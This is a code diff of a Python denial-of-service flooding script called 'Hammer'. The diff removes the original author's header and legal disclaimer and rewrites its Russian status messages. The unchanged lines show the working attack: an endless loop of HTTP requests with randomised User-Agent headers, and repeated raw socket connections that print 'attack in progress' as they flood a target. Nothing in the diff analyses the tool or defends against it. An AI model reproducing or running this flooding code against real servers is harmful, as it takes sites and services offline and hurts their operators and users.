@@ -1,11 +1,3 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-
-# python 3.3.2+ Hammer Dos Script v.1
-# by Can Yalçın
-# only for legal purpose
-
-
 from queue import Queue
 from optparse import OptionParser
 import time,sys,socket,threading,logging,urllib.request,random
@@ -35,7 +27,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mХз что тут...\033[0m")
+			print("\033[94mОтправка пакетов...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -52,7 +44,7 @@ def down_it(item):
 				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mВыполняеться атака\033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("\033[91mОтключение...\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
 		print("\033[91mНе удаётся подключиться, проверьте соединение \033[0m")
